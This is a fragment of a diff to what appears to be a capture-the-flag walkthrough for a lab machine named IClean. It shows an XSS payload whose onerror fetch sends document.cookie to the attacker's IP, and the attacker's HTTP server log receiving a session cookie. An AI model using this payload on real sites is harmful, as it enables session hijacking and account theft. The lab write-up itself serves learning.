@@ -122,4 +122,11 @@ Payload -> <img src=x on error=fetch("http://10.10.14.13/"+document.cookie)></im
 
 <br />
 
+![6](../../../assets/images/IClean/6.png)
 
+```bash
+❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.12 - - [30/Dec/2024 16:25:06] code 404, message File not found
+10.10.11.12 - - [30/Dec/2024 16:25:06] "GET /testing.pngsession=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.Z3KL3Q.0csXF3KeXH5L4JLYhYqvjWLgfX8 HTTP/1.1" 404 -
+```
